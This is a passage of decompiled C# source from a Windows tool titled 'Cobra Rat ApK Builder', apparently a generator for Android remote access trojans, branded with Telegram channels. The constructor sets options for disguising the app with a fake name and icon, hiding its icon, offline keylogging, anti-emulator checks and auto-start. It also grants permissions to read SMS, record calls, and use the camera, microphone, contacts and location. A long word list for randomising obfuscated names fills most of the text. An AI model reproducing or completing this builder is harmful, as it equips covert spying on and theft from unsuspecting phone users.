		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
		this.AutoSize = true;
		this.BackColor = System.Drawing.Color.FromArgb(10, 0, 10);
		base.ClientSize = new System.Drawing.Size(1006, 734);
		base.Controls.Add(this.box);
		this.DoubleBuffered = true;
		this.ForeColor = System.Drawing.Color.SkyBlue;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
		base.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Build";
		base.Opacity = 0.0;
		base.ShowIcon = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Cobra Rat ApK Builder By t.me/CobraRat";
		this.box.ResumeLayout(false);
		this.TABCTRL.ResumeLayout(false);
		this.TabPage10.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.TabPage9.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.Panel3.PerformLayout();
		this.Panel4.ResumeLayout(false);
		this.Panel4.PerformLayout();
		this.fakepanel.ResumeLayout(false);
		this.fakepanel.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.fakeiconpic).EndInit();
		this.TabPage11.ResumeLayout(false);
		this.Panel5.ResumeLayout(false);
		this.Panel5.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.cusomupdateimg).EndInit();
		this.TabPage12.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel6.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).EndInit();
		this.TabPage13.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		this.panelmonitorb.ResumeLayout(false);
		this.panelmonitorb.PerformLayout();
		this.panemnitor.ResumeLayout(false);
		this.panemnitor.PerformLayout();
		this.Panel10.ResumeLayout(false);
		this.Panel10.PerformLayout();
		this.TabPage14.ResumeLayout(false);
		this.TabPage14.PerformLayout();
		this.Panel9.ResumeLayout(false);
		this.Panel9.PerformLayout();
		this.Panel8.ResumeLayout(false);
		this.Panel1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public Build()
	{
		base.Load += Build_Load;
		base.Closing += Build_Closing;
		base.FormClosing += Build_FormClosing;
		MyStamp = "Cobra Rat By t.me/DarKnetJoKer 2024 Copyright\r\nTelegram Channel t.me/DarKnet_JoKer\r\nJoin With DarKnetJoKer";
		keybackVersion = false;
		spl_arguments = "[x0b0x]";
		BIND_Path = "null";
		BIND_EX = "null";
		isuper = "off";
		isAOX = "off";
		isnetwork = "off";
		iscaponce = "off";
		isautounlock = "off";
		MonitorPack = "Blank";
		trackerlist = "Blank";
		isBind = "off";
		isskipreinstall = "off";
		iskeepscreen = "off";
		isHideprims = "off";
		isadmin = "off";
		isautostart = "off";
		isQuick = "off";
		isDrawing = "off";
		isnotifi = "off";
		intent_ = "null";
		iconPatch = "null";
		Prim_sendsms = "no";
		Prim_recordcalls = "no";
		Prim_wallpaper = "no";
		Prim_readsms = "no";
		Prim_calllog = "no";
		Prim_readcontact = "no";
		Prim_readacounts = "no";
		Prim_camera = "no";
		Prim_microphone = "no";
		Prim_loacation1 = "no";
		Prim_loacation2 = "no";
		Prim_loacation3 = "no";
		Prim_callphone = "no";
		SplitterDNS = "[x0DNS0x]";
		colo0 = Color.Blue;
		colo1 = Color.Blue;
		PRIMS = "";
		THETYPE = "T";
		FAKEAPPNAME = " ";
		FAKEAPPlink = " ";
		FAKEAPPicon = "null";
		OFFKEYLOG = "null";
		ANTIEMO = "null";
		APKVERSION = "29";
		NOTIFI_MSG = "";
		NOTIFI_TITLE = "";
		HIDETYPE = "";
		TheTarget = "";
		UseRecorder = "NO";
		NewFakeSize = 0;
		_Time = 10;
		_Bitmap_ICO = null;
		cou = 0;
		vulTrack = 0;
		pack1 = "package";
		pack2 = "name";
		Nactivz = "activz";
		Nbrodatz = "brodatz";
		Nservziz = "servziz";
		Ntolziz = "tolziz";
		N_ask_prim_ = "_ask_prim_";
		N_trns_g_ = "_trns_g_";
		N_cap_sc_ = "_cap_sc_";
		N_access_ask_ = "_access_ask_";
		N_scctrl_ = "_scctrl_";
		N_news_g_ = "_news_g_";
		N_strt_view_ = "_strt_view_";
		N_sc_fb_ = "_sc_fb_";
		N_ask_draw_ = "_ask_draw_";
		N_ask_battary_ = "_ask_battary_";
		N_engine_wrk_ = "_engine_wrk_";
		N_skin_cls_ = "_skin_cls_";
		N_update_app_ = "_update_app_";
		N_callr_lsnr_ = "_callr_lsnr_";
		N_clss_loder_ = "_clss_loder_";
		N_excut_meth_ = "_excut_meth_";
		N_run_comnd_ = "_run_comnd_";
		N_get_me_fil_ = "_get_me_fil_";
		N_srv_worker_ = "_srv_worker_";
		NClassGen0 = "QQ0";
		NClassGen1 = "QQ1";
		NClassGen2 = "QQ2";
		NClassGen3 = "QQ3";
		NClassGen4 = "QQ4";
		NClassGen5 = "QQ5";
		NClassGen6 = "QQ6";
		NClassGen8 = "QQ8";
		NClassGen9 = "QQ9";
		NClassGen10 = "QQ10";
		NClassGen11 = "QQ11";
		NClassGen12 = "QQ12";
		NClassGen13 = "QQ13";
		NClassGen14 = "QQ14";
		payload = "payload";
		NresoString0 = "str0";
		NresoString1 = "str1";
		NresoString2 = "str2";
		NresoString3 = "str3";
		NresoString4 = "str4";
		NresoString5 = "str5";
		NresoString6 = "str6";
		NresoString7 = "str7";
		NresoString8 = "str8";
		NresoString9 = "str9";
		NresoString10 = "str10";
		NresoString11 = "str11";
		NresoString12 = "str12";
		Napp_reso0 = "app0";
		Ndraw_ico = "ico0";
		Ndraw_notifi = "ico1";
		NwebXML = "web0";
		NnotifiXML = "noti8";
		new_exit_mth = "str0";
		new_wifipolc = "str1";
		new_formatpacket = "str2";
		new_dzip = "str3";
		new_getbyte = "str4";
		new_base_mth = "str5";
		new_getstr = "str5";
		new_czip = "str5";
		new_inst = "str5";
		new_strt_con_ = "str5";
		new_fist_inf_ = "str5";
		new_new_con_ = "str5";
		new_send_it_ = "str5";
		new_Reblace_ = "str5";
		new_runn_srv_ = "str5";
		NEWRANDOM = "";
		rshit = null;
		oncedelete = true;
		FolderApk = false;
		Builtapk = false;
		StartedZip = false;
		encrypt_started = false;
		protectfinished = false;
		pumpstarted = false;
		pumpfinished = false;
		firstpump = false;
		Once = false;
		randmid = new string[10000]
		{
			"a", "aa", "aaa", "aaron", "ab", "abandoned", "abc", "aberdeen", "abilities", "ability",
			"able", "aboriginal", "abortion", "about", "above", "abraham", "abroad", "abs", "absence", "absent",
			"absolute", "absolutely", "absorption", "abstract", "abstracts", "abu", "abuse", "ac", "academic", "academics",
			"academy", "acc", "accent", "accept", "acceptable", "acceptance", "accepted", "accepting", "accepts", "access",
			"accessed", "accessibility", "accessible", "accessing", "accessories", "accessory", "accident", "accidents", "accommodate", "accommodation",
			"accommodations", "accompanied", "accompanying", "accomplish", "accomplished", "accordance", "according", "accordingly", "account", "accountability",
			"accounting", "accounts", "accreditation", "accredited", "accuracy", "accurate", "accurately", "accused", "acdbentity", "ace",
			"acer", "achieve", "achieved", "achievement", "achievements", "achieving", "acid", "acids", "acknowledge", "acknowledged",
			"acm", "acne", "acoustic", "acquire", "acquired", "acquisition", "acquisitions", "acre", "acres", "acrobat",
			"across", "acrylic", "act", "acting", "action", "actions", "activated", "activation", "active", "actively",
			"activists", "activities", "activity", "actor", "actors", "actress", "acts", "actual", "actually", "acute",
			"ad", "ada", "adam", "adams", "adaptation", "adapted", "adapter", "adapters", "adaptive", "adaptor",
			"add", "added", "addiction", "adding", "addition", "additional", "additionally", "additions", "address", "addressed",
			"addresses", "addressing", "adds", "adelaide", "adequate", "adidas", "adipex", "adjacent", "adjust", "adjustable",
			"adjusted", "adjustment", "adjustments", "admin", "administered", "administration", "administrative", "administrator", "administrators", "admission",
			"admissions", "admit", "admitted", "adobe", "adolescent", "adopt", "adopted", "adoption", "adrian", "ads",
			"adsl", "adult", "adults", "advance", "advanced", "advancement", "advances", "advantage", "advantages", "adventure",
			"adventures", "adverse", "advert", "advertise", "advertisement", "advertisements", "advertiser", "advertisers", "advertising", "advice",
			"advise", "advised", "advisor", "advisors", "advisory", "advocacy", "advocate", "adware", "ae", "aerial",
			"aerospace", "af", "affair", "affairs", "affect", "affected", "affecting", "affects", "affiliate", "affiliated",
			"affiliates", "affiliation", "afford", "affordable", "afghanistan", "afraid", "africa", "african", "after", "afternoon",
			"afterwards", "ag", "again", "against", "age", "aged", "agencies", "agency", "agenda", "agent",
			"agents", "ages", "aggregate", "aggressive", "aging", "ago", "agree", "agreed", "agreement", "agreements",
			"agrees", "agricultural", "agriculture", "ah", "ahead", "ai", "aid", "aids", "aim", "aimed",
			"aims", "air", "aircraft", "airfare", "airline", "airlines", "airplane", "airport", "airports", "aj",
			"ak", "aka", "al", "ala", "alabama", "alan", "alarm", "alaska", "albania", "albany",
			"albert", "alberta", "album", "albums", "albuquerque", "alcohol", "alert", "alerts", "alex", "alexander",
			"alexandria", "alfred", "algebra", "algeria", "algorithm", "algorithms", "ali", "alias", "alice", "alien",
			"align", "alignment", "alike", "alive", "all", "allah", "allan", "alleged", "allen", "allergy",
			"alliance", "allied", "allocated", "allocation", "allow", "allowance", "allowed", "allowing", "allows", "alloy",
			"almost", "alone", "along", "alot", "alpha", "alphabetical", "alpine", "already", "also", "alt",
			"alter", "altered", "alternate", "alternative", "alternatively", "alternatives", "although", "alto", "aluminium", "aluminum",
			"alumni", "always", "am", "amanda", "amateur", "amazing", "amazon", "amazoncom", "amazoncouk", "ambassador",
			"amber", "ambien", "ambient", "amd", "amend", "amended", "amendment", "amendments", "amenities", "america",
			"american", "americans", "americas", "amino", "among", "amongst", "amount", "amounts", "amp", "ampland",
			"amplifier", "amsterdam", "amy", "an", "ana", "anaheim", "anal", "analog", "analyses", "analysis",
			"analyst", "analysts", "analytical", "analyze", "analyzed", "anatomy", "anchor", "ancient", "and", "andale",
			"anderson", "andorra", "andrea", "andreas", "andrew", "andrews", "andy", "angel", "angela", "angeles",
			"angels", "anger", "angle", "angola", "angry", "animal", "animals", "animated", "animation", "anime",
			"ann", "anna", "anne", "annex", "annie", "anniversary", "annotated", "annotation", "announce", "announced",
			"announcement", "announcements", "announces", "annoying", "annual", "annually", "anonymous", "another", "answer", "answered",
			"answering", "answers", "ant", "antarctica", "antenna", "anthony", "anthropology", "anti", "antibodies", "antibody",
			"anticipated", "antigua", "antique", "antiques", "antivirus", "antonio", "anxiety", "any", "anybody", "anymore",
			"anyone", "anything", "anytime", "anyway", "anywhere", "aol", "ap", "apache", "apart", "apartment",
			"apartments", "api", "apnic", "apollo", "app", "apparatus", "apparel", "apparent", "apparently", "appeal",
			"appeals", "appear", "appearance", "appeared", "appearing", "appears", "appendix", "apple", "appliance", "appliances",
			"applicable", "applicant", "applicants", "application", "applications", "applied", "applies", "apply", "applying", "appointed",
			"appointment", "appointments", "appraisal", "appreciate", "appreciated", "appreciation", "approach", "approaches", "appropriate", "appropriations",
			"approval", "approve", "approved", "approx", "approximate", "approximately", "apps", "apr", "april", "apt",
			"aqua", "aquarium", "aquatic", "ar", "arab", "arabia", "arabic", "arbitrary", "arbitration", "arc",
			"arcade", "arch", "architect", "architects", "architectural", "architecture", "archive", "archived", "archives", "arctic",
			"are", "area", "areas", "arena", "arg", "argentina", "argue", "argued", "argument", "arguments",
			"arise", "arising", "arizona", "arkansas", "arlington", "arm", "armed", "armenia", "armor", "arms",
			"armstrong", "army", "arnold", "around", "arrange", "arranged", "arrangement", "arrangements", "array", "arrest",
			"arrested", "arrival", "arrivals", "arrive", "arrived", "arrives", "arrow", "art", "arthritis", "arthur",
			"article", "articles", "artificial", "artist", "artistic", "artists", "arts", "artwork", "aruba", "as",
			"asbestos", "ascii", "ash", "ashley", "asia", "asian", "aside", "asin", "ask", "asked",
			"asking", "asks", "asn", "asp", "aspect", "aspects", "aspnet", "ass", "assault", "assembled",
			"assembly", "assess", "assessed", "assessing", "assessment", "assessments", "asset", "assets", "assign", "assigned",
			"assignment", "assignments", "assist", "assistance", "assistant", "assisted", "assists", "associate", "associated", "associates",
			"association", "associations", "assume", "assumed", "assumes", "assuming", "assumption", "assumptions", "assurance", "assure",
			"assured", "asthma", "astrology", "astronomy", "asus", "at", "ata", "ate", "athens", "athletes",
			"athletic", "athletics", "ati", "atlanta", "atlantic", "atlas", "atm", "atmosphere", "atmospheric", "atom",
			"atomic", "attach", "attached", "attachment", "attachments", "attack", "attacked", "attacks", "attempt", "attempted",
			"attempting", "attempts", "attend", "attendance", "attended", "attending", "attention", "attitude", "attitudes", "attorney",
			"attorneys", "attract", "attraction", "attractions", "attractive", "attribute", "attributes", "au", "auburn", "auckland",
			"auction", "auctions", "aud", "audi", "audience", "audio", "audit", "auditor", "aug", "august",
			"aurora", "aus", "austin", "australia", "australian", "austria", "authentic", "authentication", "author", "authorities",
			"authority", "authorization", "authorized", "authors", "auto", "automated", "automatic", "automatically", "automation", "automobile",
			"automobiles", "automotive", "autos", "autumn", "av", "availability", "available", "avatar", "ave", "avenue",
			"average", "avg", "avi", "aviation", "avoid", "avoiding", "avon", "aw", "award", "awarded",
			"awards", "aware", "awareness", "away", "awesome", "awful", "axis", "aye", "az", "azerbaijan",
			"b", "ba", "babe", "babes", "babies", "baby", "bachelor", "back", "backed", "background",
			"backgrounds", "backing", "backup", "bacon", "bacteria", "bacterial", "bad", "badge", "badly", "bag",
			"baghdad", "bags", "bahamas", "bahrain", "bailey", "baker", "baking", "balance", "balanced", "bald",
			"bali", "ball", "ballet", "balloon", "ballot", "balls", "baltimore", "ban", "banana", "band",
			"bands", "bandwidth", "bang", "bangbus", "bangkok", "bangladesh", "bank", "banking", "bankruptcy", "banks",
			"banned", "banner", "banners", "baptist", "bar", "barbados", "barbara", "barbie", "barcelona", "bare",
			"barely", "bargain", "bargains", "barn", "barnes", "barrel", "barrier", "barriers", "barry", "bars",
			"base", "baseball", "based", "baseline", "basement", "basename", "bases", "basic", "basically", "basics",
			"basin", "basis", "basket", "basketball", "baskets", "bass", "bat", "batch", "bath", "bathroom",
			"bathrooms", "baths", "batman", "batteries", "battery", "battle", "battlefield", "bay", "bb", "bbc",
			"bbs", "bbw", "bc", "bd", "bdsm", "be", "beach", "beaches", "beads", "beam",
			"bean", "beans", "bear", "bearing", "bears", "beast", "beastality", "beastiality", "beat", "beatles",
			"beats", "beautiful", "beautifully", "beauty", "beaver", "became", "because", "become", "becomes", "becoming",
			"bed", "bedding", "bedford", "bedroom", "bedrooms", "beds", "bee", "beef", "been", "beer",
			"before", "began", "begin", "beginner", "beginners", "beginning", "begins", "begun", "behalf", "behavior",
			"behavioral", "behaviour", "behind", "beijing", "being", "beings", "belarus", "belfast", "belgium", "belief",
			"beliefs", "believe", "believed", "believes", "belize", "belkin", "bell", "belle", "belly", "belong",
			"belongs", "below", "belt", "belts", "ben", "bench", "benchmark", "bend", "beneath", "beneficial",
			"benefit", "benefits", "benjamin", "bennett", "benz", "berkeley", "berlin", "bermuda", "bernard", "berry",
			"beside", "besides", "best", "bestiality", "bestsellers", "bet", "beta", "beth", "better", "betting",
			"betty", "between", "beverage", "beverages", "beverly", "beyond", "bg", "bhutan", "bi", "bias",
			"bible", "biblical", "bibliographic", "bibliography", "bicycle", "bid", "bidder", "bidding", "bids", "big",
			"bigger", "biggest", "bike", "bikes", "bikini", "bill", "billing", "billion", "bills", "billy",
			"bin", "binary", "bind", "binding", "bingo", "bio", "biodiversity", "biographies", "biography", "biol",
			"biological", "biology", "bios", "biotechnology", "bird", "birds", "birmingham", "birth", "birthday", "bishop",
			"bit", "bitch", "bite", "bits", "biz", "bizarre", "bizrate", "bk", "bl", "black",
			"blackberry", "blackjack", "blacks", "blade", "blades", "blah", "blair", "blake", "blame", "blank",
			"blanket", "blast", "bleeding", "blend", "bless", "blessed", "blind", "blink", "block", "blocked",
			"blocking", "blocks", "blog", "blogger", "bloggers", "blogging", "blogs", "blond", "blonde", "blood",
			"bloody", "bloom", "bloomberg", "blow", "blowing", "blowjob", "blowjobs", "blue", "blues", "bluetooth",
			"blvd", "bm", "bmw", "bo", "board", "boards", "boat", "boating", "boats", "bob",
			"bobby", "boc", "bodies", "body", "bold", "bolivia", "bolt", "bomb", "bon", "bond",
			"bondage", "bonds", "bone", "bones", "bonus", "boob", "boobs", "book", "booking", "bookings",
			"bookmark", "bookmarks", "books", "bookstore", "bool", "boolean", "boom", "boost", "boot", "booth",
			"boots", "booty", "border", "borders", "bored", "boring", "born", "borough", "bosnia", "boss",
			"boston", "both", "bother", "botswana", "bottle", "bottles", "bottom", "bought", "boulder", "boulevard",
			"bound", "boundaries", "boundary", "bouquet", "boutique", "bow", "bowl", "bowling", "box", "boxed",
			"boxes", "boxing", "boy", "boys", "bp", "br", "bra", "bracelet", "bracelets", "bracket",
			"brad", "bradford", "bradley", "brain", "brake", "brakes", "branch", "branches", "brand", "brandon",
			"brands", "bras", "brass", "brave", "brazil", "brazilian", "breach", "bread", "break", "breakdown",
			"breakfast", "breaking", "breaks", "breast", "breasts", "breath", "breathing", "breed", "breeding", "breeds",
			"brian", "brick", "bridal", "bride", "bridge", "bridges", "brief", "briefing", "briefly", "briefs",
			"bright", "brighton", "brilliant", "bring", "bringing", "brings", "brisbane", "bristol", "britain", "britannica",
			"british", "britney", "broad", "broadband", "broadcast", "broadcasting", "broader", "broadway", "brochure", "brochures",
			"broke", "broken", "broker", "brokers", "bronze", "brook", "brooklyn", "brooks", "bros", "brother",
			"brothers", "brought", "brown", "browse", "browser", "browsers", "browsing", "bruce", "brunei", "brunette",
			"brunswick", "brush", "brussels", "brutal", "bryan", "bryant", "bs", "bt", "bubble", "buck",
			"bucks", "budapest", "buddy", "budget", "budgets", "buf", "buffalo", "buffer", "bufing", "bug",
			"bugs", "build", "builder", "builders", "building", "buildings", "builds", "built", "bukkake", "bulgaria",
			"bulgarian", "bulk", "bull", "bullet", "bulletin", "bumper", "bunch", "bundle", "bunny", "burden",
			"bureau", "buried", "burke", "burlington", "burn", "burner", "burning", "burns", "burst", "burton",
			"bus", "buses", "bush", "business", "businesses", "busty", "busy", "but", "butler", "butt",
			"butter", "butterfly", "button", "buttons", "butts", "buy", "buyer", "buyers", "buying", "buys",
			"buzz", "bw", "by", "bye", "byte", "bytes", "c", "ca", "cab", "cabin",
			"cabinet", "cabinets", "cable", "cables", "cache", "cached", "cad", "cadillac", "cafe", "cage",
			"cake", "cakes", "cal", "calcium", "calculate", "calculated", "calculation", "calculations", "calculator", "calculators",
			"calendar", "calendars", "calgary", "calibration", "calif", "california", "call", "called", "calling", "calls",
			"calm", "calvin", "cam", "cambodia", "cambridge", "camcorder", "camcorders", "came", "camel", "camera",
			"cameras", "cameron", "cameroon", "camp", "campaign", "campaigns", "campbell", "camping", "camps", "campus",
			"cams", "can", "canada", "canadian", "canal", "canberra", "cancel", "cancellation", "cancelled", "cancer",
			"candidate", "candidates", "candle", "candles", "candy", "cannon", "canon", "cant", "canvas", "canyon",
			"cap", "capabilities", "capability", "capable", "capacity", "cape", "capital", "capitol", "caps", "captain",
			"capture", "captured", "car", "carb", "carbon", "card", "cardiac", "cardiff", "cardiovascular", "cards",
			"care", "career", "careers", "careful", "carefully", "carey", "cargo", "caribbean", "caring", "carl",
			"carlo", "carlos", "carmen", "carnival", "carol", "carolina", "caroline", "carpet", "carried", "carrier",
			"carriers", "carries", "carroll", "carry", "carrying", "cars", "cart", "carter", "cartoon", "cartoons",
			"cartridge", "cartridges", "cas", "casa", "case", "cases", "casey", "cash", "cashiers", "casino",
			"casinos", "casio", "cassette", "cast", "casting", "castle", "casual", "cat", "catalog", "catalogs",
			"catalogue", "catalyst", "catch", "categories", "category", "catering", "cathedral", "catherine", "catholic", "cats",
			"cattle", "caught", "cause", "caused", "causes", "causing", "caution", "cave", "cayman", "cb",
			"cbs", "cc", "ccd", "cd", "cdna", "cds", "cdt", "ce", "cedar", "ceiling",
			"celebrate", "celebration", "celebrities", "celebrity", "celebs", "cell", "cells", "cellular", "celtic", "cement",
			"cemetery", "census", "cent", "center", "centered", "centers", "central", "centre", "centres", "cents",
			"centuries", "century", "ceo", "ceramic", "ceremony", "certain", "certainly", "certificate", "certificates", "certification",
			"certified", "cest", "cet", "cf", "cfr", "cg", "cgi", "ch", "chad", "chain",
			"chains", "chair", "chairman", "chairs", "challenge", "challenged", "challenges", "challenging", "chamber", "chambers",
			"champagne", "champion", "champions", "championship", "championships", "chan", "chance", "chancellor", "chances", "change",
			"changed", "changelog", "changes", "changing", "channel", "channels", "chaos", "chapel", "chapter", "chapters",
			"char", "character", "characteristic", "characteristics", "characterization", "characterized", "characters", "charge", "charged", "charger",
			"chargers", "charges", "charging", "charitable", "charity", "charles", "charleston", "charlie", "charlotte", "charm",
			"charming", "charms", "chart", "charter", "charts", "chase", "chassis", "chat", "cheap", "cheaper",
			"cheapest", "cheat", "cheats", "check", "checked", "checking", "checklist", "checkout", "checks", "cheers",
			"cheese", "chef", "chelsea", "chem", "chemical", "chemicals", "chemistry", "chen", "cheque", "cherry",
			"chess", "chest", "chester", "chevrolet", "chevy", "chi", "chicago", "chick", "chicken", "chicks",
			"chief", "child", "childhood", "children", "childrens", "chile", "china", "chinese", "chip", "chips",
			"cho", "chocolate", "choice", "choices", "choir", "cholesterol", "choose", "choosing", "chorus", "chose",
			"chosen", "chris", "christ", "christian", "christianity", "christians", "christina", "christine", "christmas", "christopher",
			"chrome", "chronic", "chronicle", "chronicles", "chrysler", "chubby", "chuck", "church", "churches", "ci",
			"cia", "cialis", "ciao", "cigarette", "cigarettes", "cincinnati", "cindy", "cinema", "cingular", "cio",
			"cir", "circle", "circles", "circuit", "circuits", "circular", "circulation", "circumstances", "circus", "cisco",
			"citation", "citations", "cite", "cited", "cities", "citizen", "citizens", "citizenship", "city", "citysearch",
			"civic", "civil", "civilian", "civilization", "cj", "cl", "claim", "claimed", "claims", "claire",
			"clan", "clara", "clarity", "clark", "clarke", "class", "classes", "classic", "classical", "classics",
			"classification", "classified", "classifieds", "classroom", "clause", "clay", "clean", "cleaner", "cleaners", "cleaning",
			"cleanup", "clear", "clearance", "cleared", "clearing", "clearly", "clerk", "cleveland", "click", "clicking",
			"clicks", "client", "clients", "cliff", "climate", "climb", "climbing", "clinic", "clinical", "clinics",
			"clinton", "clip", "clips", "clock", "clocks", "clone", "close", "closed", "closely", "closer",
			"closes", "closest", "closing", "closure", "cloth", "clothes", "clothing", "cloud", "clouds", "cloudy",
			"club", "clubs", "cluster", "clusters", "cm", "cms", "cn", "cnet", "cnetcom", "cnn",
			"co", "coach", "coaches", "coaching", "coal", "coalition", "coast", "coastal", "coat", "coated",
			"coating", "cock", "cocks", "cod", "code", "codes", "coding", "coffee", "cognitive", "cohen",
			"coin", "coins", "col", "cold", "cole", "coleman", "colin", "collaboration", "collaborative", "collapse",
			"collar", "colleague", "colleagues", "collect", "collectables", "collected", "collectible", "collectibles", "collecting", "collection",
			"collections", "collective", "collector", "collectors", "college", "colleges", "collins", "cologne", "colombia", "colon",
			"colonial", "colony", "color", "colorado", "colored", "colors", "colour", "colours", "columbia", "columbus",
			"column", "columnists", "columns", "org", "combat", "combination", "combinations", "combine", "combined", "combines",
			"combining", "combo", "come", "comedy", "comes", "comfort", "comfortable", "comic", "comics", "coming",
			"comm", "command", "commander", "commands", "comment", "commentary", "commented", "comments", "commerce", "commercial",
			"commission", "commissioner", "commissioners", "commissions", "commit", "commitment", "commitments", "committed", "committee", "committees",
			"commodities", "commodity", "common", "commonly", "commons", "commonwealth", "communicate", "communication", "communications", "communist",
			"communities", "community", "comp", "compact", "companies", "companion", "company", "compaq", "comparable", "comparative",
			"compare", "compared", "comparing", "comparison", "comparisons", "compatibility", "compatible", "compensation", "compete", "competent",
			"competing", "competition", "competitions", "competitive", "competitors", "compilation", "compile", "compiled", "compiler", "complaint",
			"complaints", "complement", "complete", "completed", "completely", "completing", "completion", "complex", "complexity", "compliance",
			"compliant", "complicated", "complications", "complimentary", "comply", "component", "components", "composed", "composer", "composite",
			"composition", "compound", "compounds", "comprehensive", "compressed", "compression", "compromise", "computation", "computational", "compute",
			"computed", "computer", "computers", "computing", "con", "concentrate", "concentration", "concentrations", "concept", "concepts",
			"conceptual", "concern", "concerned", "concerning", "concerns", "concert", "concerts", "conclude", "concluded", "conclusion",
			"conclusions", "concord", "concrete", "condition", "conditional", "conditioning", "conditions", "condo", "condos", "conduct",
			"conducted", "conducting", "conf", "conference", "conferences", "conferencing", "confidence", "confident", "confidential", "confidentiality",
			"config", "configuration", "configure", "configured", "configuring", "confirm", "confirmation", "confirmed", "conflict", "conflicts",
			"confused", "confusion", "congo", "congratulations", "congress", "congressional", "conjunction", "connect", "connected", "connecticut",
			"connecting", "connection", "connections", "connectivity", "connector", "connectors", "cons", "conscious", "consciousness", "consecutive",
			"consensus", "consent", "consequence", "consequences", "consequently", "conservation", "conservative", "consider", "considerable", "consideration",
			"considerations", "considered", "considering", "considers", "consist", "consistency", "consistent", "consistently", "consisting", "consists",
			"console", "consoles", "consolidated", "consolidation", "consortium", "conspiracy", "const", "constant", "constantly", "constitute",
			"constitutes", "constitution", "constitutional", "constraint", "constraints", "construct", "constructed", "construction", "consult", "consultancy",
			"consultant", "consultants", "consultation", "consulting", "consumer", "consumers", "consumption", "contact", "contacted", "contacting",
			"contacts", "contain", "contained", "container", "containers", "containing", "contains", "contamination", "contemporary", "content",
			"contents", "contest", "contests", "context", "continent", "continental", "continually", "continue", "continued", "continues",
			"continuing", "continuity", "continuous", "continuously", "contract", "contracting", "contractor", "contractors", "contracts", "contrary",
			"contrast", "contribute", "contributed", "contributing", "contribution", "contributions", "contributor", "contributors", "control", "controlled",
			"controller", "controllers", "controlling", "controls", "controversial", "controversy", "convenience", "convenient", "convention", "conventional",
			"conventions", "convergence", "conversation", "conversations", "conversion", "convert", "converted", "converter", "convertible", "convicted",
			"conviction", "convinced", "cook", "cookbook", "cooked", "cookie", "cookies", "cooking", "cool", "cooler",
			"cooling", "cooper", "cooperation", "cooperative", "coordinate", "coordinated", "coordinates", "coordination", "coordinator", "cop",
			"cope", "copied", "copies", "copper", "copy", "copying", "copyright", "copyrighted", "copyrights", "coral",
			"cord", "cordless", "core", "cork", "corn", "cornell", "corner", "corners", "cornwall", "corp",
			"corporate", "corporation", "corporations", "corps", "corpus", "correct", "corrected", "correction", "corrections", "correctly",
			"correlation", "correspondence", "corresponding", "corruption", "cos", "cosmetic", "cosmetics", "cost", "costa", "costs",
			"costume", "costumes", "cottage", "cottages", "cotton", "could", "council", "councils", "counsel", "counseling",
			"count", "counted", "counter", "counters", "counties", "counting", "countries", "country", "counts", "county",
			"couple", "coupled", "couples", "coupon", "coupons", "courage", "courier", "course", "courses", "court",
			"courtesy", "courts", "cove", "cover", "coverage", "covered", "covering", "covers", "cow", "cowboy",
			"cox", "cp", "cpu", "cr", "crack", "cradle", "craft", "crafts", "craig", "crap",
			"craps", "crash", "crawford", "crazy", "cream", "create", "created", "creates", "creating", "creation",
			"creations", "creative", "creativity", "creator", "creature", "creatures", "credit", "credits", "creek", "crest",
			"crew", "cricket", "crime", "crimes", "criminal", "crisis", "criteria", "criterion", "critical", "criticism",
			"critics", "crm", "croatia", "crop", "crops", "cross", "crossing", "crossword", "crowd", "crown",
			"crucial", "crude", "cruise", "cruises", "cruz", "cry", "crystal", "cs", "css", "cst",
			"ct", "cu", "cuba", "cube", "cubic", "cuisine", "cult", "cultural", "culture", "cultures",
			"cum", "cumshot", "cumshots", "cumulative", "cunt", "cup", "cups", "cure", "curious", "currencies",
			"currency", "current", "currently", "curriculum", "cursor", "curtis", "curve", "curves", "custody", "custom",
			"customer", "customers", "customise", "customize", "customized", "customs", "cut", "cute", "cuts", "cutting",
			"cv", "cvs", "cw", "cyber", "cycle", "cycles", "cycling", "cylinder", "cyprus", "cz",
			"czech", "d", "da", "dad", "daddy", "daily", "dairy", "daisy", "dakota", "dale",
			"dallas", "dam", "damage", "damaged", "damages", "dame", "damn", "dan", "dana", "dance",
			"dancing", "danger", "dangerous", "daniel", "danish", "danny", "dans", "dare", "dark", "darkness",
			"darwin", "das", "dash", "dat", "data", "database", "databases", "date", "dated", "dates",
			"dating", "daughter", "daughters", "dave", "david", "davidson", "davis", "dawn", "day", "days",
			"dayton", "db", "dc", "dd", "ddr", "de", "dead", "deadline", "deadly", "deaf",
			"deal", "dealer", "dealers", "dealing", "deals", "dealt", "dealtime", "dean", "dear", "death",
			"deaths", "debate", "debian", "deborah", "debt", "debug", "debut", "dec", "decade", "decades",
			"december", "decent", "decide", "decided", "decimal", "decision", "decisions", "deck", "declaration", "declare",
			"declared", "decline", "declined", "decor", "decorating", "decorative", "decrease", "decreased", "dedicated", "dee",
			"deemed", "deep", "deeper", "deeply", "deer", "def", "default", "defeat", "defects", "defence",
			"defend", "defendant", "defense", "defensive", "deferred", "deficit", "define", "defined", "defines", "defining",
			"definitely", "definition", "definitions", "degree", "degrees", "del", "delaware", "delay", "delayed", "delays",
			"delegation", "delete", "deleted", "delhi", "delicious", "delight", "deliver", "delivered", "delivering", "delivers",
			"delivery", "dell", "delta", "deluxe", "dem", "demand", "demanding", "demands", "demo", "democracy",
			"democrat", "democratic", "democrats", "demographic", "demonstrate", "demonstrated", "demonstrates", "demonstration", "den", "denial",
			"denied", "denmark", "dennis", "dense", "density", "dental", "dentists", "denver", "deny", "department",
			"departmental", "departments", "departure", "depend", "dependence", "dependent", "depending", "depends", "deployment", "deposit",
			"deposits", "depot", "depression", "dept", "depth", "deputy", "der", "derby", "derek", "derived",
